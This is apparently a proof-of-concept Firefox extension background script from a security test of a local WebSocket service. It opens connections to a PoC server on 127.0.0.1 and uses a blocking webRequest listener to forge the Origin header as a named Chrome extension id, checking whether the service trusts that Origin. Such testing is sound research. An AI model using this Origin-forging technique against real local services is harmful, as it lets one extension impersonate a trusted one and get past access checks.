// PoC background script, lot L5 (goal-6t00P5LW). Driven by poc-config.js
// (written fresh before each install by run-firefox.ts). Two jobs:
//  (a) open one or more WebSockets to ws://127.0.0.1:18801, each carrying a
//      ?label=... query param the PoC server logs against the Origin header
//      it actually received;
//  (b) for connections marked forge:true, rewrite the outgoing Origin header
//      to the real Wingpen Chrome extension id via a blocking
//      webRequest.onBeforeSendHeaders listener — this is the C2/C3 forgery
//      attempt itself.

const WINGPEN_FORGED_ORIGIN = "chrome-extension://hehlgipomfminodhahcjbencblepjhah";

// self.POC_CONFIG = { connections: [{ label, forge }] } — see poc-config.js.
const config = self.POC_CONFIG || { connections: [{ label: "default", forge: false }] };

browser.webRequest.onBeforeSendHeaders.addListener(
  (details) => {
    const shouldForge = config.connections.some((c) => c.forge && details.url.includes(`label=${c.label}`));
    if (!shouldForge) return {};
    const headers = details.requestHeaders || [];
    let found = false;
    for (const h of headers) {
      if (h.name.toLowerCase() === "origin") {
        h.value = WINGPEN_FORGED_ORIGIN;
        found = true;
      }
    }
    if (!found) headers.push({ name: "Origin", value: WINGPEN_FORGED_ORIGIN });
    console.log("poc-origin: rewrote Origin ->", WINGPEN_FORGED_ORIGIN, "for", details.url);
    return { requestHeaders: headers };
  },
  { urls: ["ws://127.0.0.1/*", "http://127.0.0.1/*"] },
  ["blocking", "requestHeaders"],
);

async function openOne(label) {
  return new Promise((resolve) => {
    const realOrigin = browser.runtime.getURL("").replace(/\/$/, "");
    const url = `ws://127.0.0.1:18801/?label=${encodeURIComponent(label)}`;
    console.log("poc-origin: opening", url, "real moz-extension origin is", realOrigin);
    const ws = new WebSocket(url);
    ws.onopen = () => {
      ws.send(JSON.stringify({ cmd: "report", label, realOrigin }));
    };
    ws.onmessage = (ev) => {
      console.log("poc-origin: server said", ev.data);
    };
    ws.onerror = (err) => {
      console.error("poc-origin: ws error for", label, err);
      resolve();
    };
    ws.onclose = () => resolve();
    // Give the server time to log + reply, then move on to the next connection.
    setTimeout(() => {
      try {
        ws.close();
      } catch {}
      resolve();
    }, 1500);
  });
}

async function runAll() {
  for (const c of config.connections) {
    await openOne(c.label);
  }
  console.log("poc-origin: all connections attempted");
}

runAll();
